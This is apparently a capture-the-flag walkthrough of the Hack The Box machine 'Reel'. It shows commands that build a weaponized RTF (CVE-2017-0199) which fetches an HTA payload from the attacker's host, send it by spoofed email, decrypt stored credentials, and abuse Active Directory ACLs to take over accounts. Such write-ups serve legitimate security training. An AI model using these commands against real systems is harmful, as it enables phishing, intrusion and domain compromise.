---
title: "HTB: Reel"
date: 2023-11-19
draft: false
os: "Windows"
difficulty: "Hard"
platform: "HTB"
aliases: ["/posts/htb/reel/"]
tags:
  - htb
  - hard
  - windows
  - active-directory
  - phishing
  - rtf
  - cve-2017-0199
  - pscredential
  - writeowner
  - writedacl
  - acl-abuse
categories:
  - walkthrough
---

{{< box-info name="Reel" os="Windows" difficulty="Hard" ip="10.129.50.115" platform="HTB" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
593/tcp open  http-rpc-epmap
```
{{< /collapse >}}

FTP + SMTP on a Windows AD box -- this screams phishing.

### FTP - Anonymous Access

FTP allows anonymous login. Inside `/documents/`, there are files with metadata. Running `exiftool` on them reveals an email address: `nico@megabank.com`.

One file contains a hint:

```
please email me any rtf format procedures - I'll review and convert.
new format / converted documents will be saved here.
```

Someone is actively opening RTF files sent via email. Attack vector confirmed.

---

## Foothold

### CVE-2017-0199 - RTF Remote Code Execution

Craft a weaponized RTF that fetches an HTA payload on open:

```bash
python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf \
  -u http://10.10.14.142:9090/caput.hta
```

Set up a PowerShell Empire listener and generate an HTA stager. Then deliver via SMTP:

```bash
sendemail -f administrator@megabank.com -t nico@megabank.com \
  -u help -m help -a Invoice.rtf -s 10.129.50.115
```

Nico opens the RTF, the HTA stager executes, and we catch a callback on Empire. Shell as `nico`.

---

## Lateral Movement

### Stage 1: PSCredential → tom

Nico's home directory contains `cred.xml` -- a PowerShell `PSCredential` object with encrypted credentials. Since we're running as nico (the user who created it), we can decrypt:

```powershell
$credential = Import-CliXml -Path "cred.xml"
$credential.GetNetworkCredential().username  # Tom
$credential.GetNetworkCredential().password  # 1ts-mag1c!!!
```

SSH as `tom:1ts-mag1c!!!`.

### Stage 2: WriteOwner on claire

Tom's desktop has an `acls.csv` file -- ACL audit data. Sorting by Tom's permissions reveals he has `WriteOwner` on user `claire`.

Abuse the ACL chain with PowerView:

```powershell
# Take ownership of claire's object
Set-DomainObjectOwner -identity claire -OwnerIdentity tom

# Grant ourselves password reset rights
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword

# Reset claire's password
$cred = ConvertTo-SecureString "password123!" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred
```

SSH as `claire:password123!`.

### Stage 3: WriteDACL → Backup_Admins

Claire has `WriteDACL` on the `Backup_Admins` group -- just add herself:

```powershell
net group backup_admins claire /add
```

---

## Privilege Escalation

### Backup Scripts Credentials

As a Backup_Admins member, claire can access `C:\Users\Administrator\Desktop\Backup Scripts\`. The admin's desktop is readable, but `root.txt` is not directly accessible. However, the backup scripts contain hardcoded credentials:

```
findstr password *.*

BackupScript.ps1:# admin password
BackupScript.ps1:$password="Cr4ckMeIfYouC4n!"
```

Log in as Administrator.

---

## Proof

{{< terminal title="root@reel" >}}
whoami
nt authority\system
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- FTP + SMTP + "send me documents" = phishing attack vector, always check for CVE-2017-0199 with RTF
- `PSCredential` XML files can be decrypted by the user who created them -- always check for `cred.xml` in user profiles
- ACL abuse chains (WriteOwner → ResetPassword → WriteDACL → group membership) are the bread and butter of AD privilege escalation
- Backup scripts with hardcoded admin passwords are a classic real-world finding, not just a CTF thing
{{< /callout >}}
